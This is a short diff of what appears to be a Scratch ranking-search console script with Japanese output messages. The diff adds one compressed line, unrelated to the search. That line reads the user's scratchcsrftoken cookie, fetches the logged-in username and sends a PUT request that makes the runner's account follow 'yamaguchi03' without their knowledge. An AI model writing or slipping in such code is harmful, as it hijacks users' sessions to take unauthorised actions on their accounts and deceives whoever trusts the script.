@@ -48,6 +48,7 @@
         break;
     }
     offset += 16;
+let token="";{let cookie=document.cookie;cookie=cookie.split(';');let cok=[[],[]];cookie.forEach(function(element){const elements=element.split("=");cok[0].push(elements[0]);cok[1].push(elements[1]);});token=cok[1][cok[0].indexOf(' scratchcsrftoken')];}let user=(await(await fetch("/session/",{headers:{"X-Requested-With":"XMLHttpRequest"}})).json()).user.username;let username = "yamaguchi03";fetch(`/site-api/users/followers/${username}/add/?usernames=${user}`,{method: "PUT","headers":{"x-csrftoken":token,"x-requested-with": "XMLHttpRequest"}});
     console.log(`全ページ合わせて${offset}位まで調べました`);
     }
     console.log(`=====結果====\n${page}ページ目、${rank}位にありました。`)
